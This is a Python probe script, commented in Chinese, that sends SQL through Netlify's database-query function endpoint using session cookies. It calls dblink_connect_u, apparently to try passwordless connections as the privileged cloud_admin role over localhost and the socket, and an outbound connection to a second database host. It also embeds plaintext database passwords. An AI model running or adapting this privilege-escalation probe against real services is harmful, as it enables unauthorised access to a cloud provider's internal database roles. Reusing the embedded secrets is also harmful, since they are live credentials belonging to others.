# -*- coding: utf-8 -*-
"""dblink_connect_u 技术测试(owner=cloud_admin 的 definer 函数)
1. 本地 cloud_admin 无密码连接(localhost)
2. 基线:自己 netlifydb_owner 带密码
3. 出站:B compute(自己账号,仅验证网络可达性)
全程只读 + disconnect 清理"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A, COOKIE_B

PWD_B_OWNER = 'npg_TWUSd2Mavu7G'  # B production owner(B 库凭据,之前会话验证过)
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, cookie=COOKIE_A):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=60)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': cookie}
    body = {'siteId': SITE_A, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:1200].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def try_conn(label, connstr, followup="select current_user::text as u"):
    st, out = tx(["select dblink_connect_u('c1', %s)" % qq(connstr),
                  "select * from dblink('c1', %s) as t(u text)" % qq(followup),
                  "select dblink_disconnect('c1')"])
    print('%-30s [%d] %s' % (label, st, out[:300]))


def qq(s):
    return "'" + s.replace("'", "''") + "'"


print('== dblink_connect_u 探测 ==')
# 1. 本地 cloud_admin 无密码
try_conn('local cloud_admin nopw', 'host=127.0.0.1 port=5432 dbname=netlifydb user=cloud_admin')
# 1b. socket
try_conn('local cloud_admin nopw sock', 'host=/var/run/postgresql dbname=netlifydb user=cloud_admin')
# 2. 基线 owner 带密码
try_conn('local owner w/ pw', 'host=127.0.0.1 port=5432 dbname=netlifydb user=netlifydb_owner password=npg_MtTpnyk2LE4j')
# 3. 出站 B compute(owner 带密码,B 的库)
try_conn('outbound B compute', 'host=ep-cold-unit-ae9s4l3i.c-2.us-east-2.db.netlify.com port=5432 dbname=netlifydb user=netlifydb_owner password=%s' % PWD_B_OWNER)
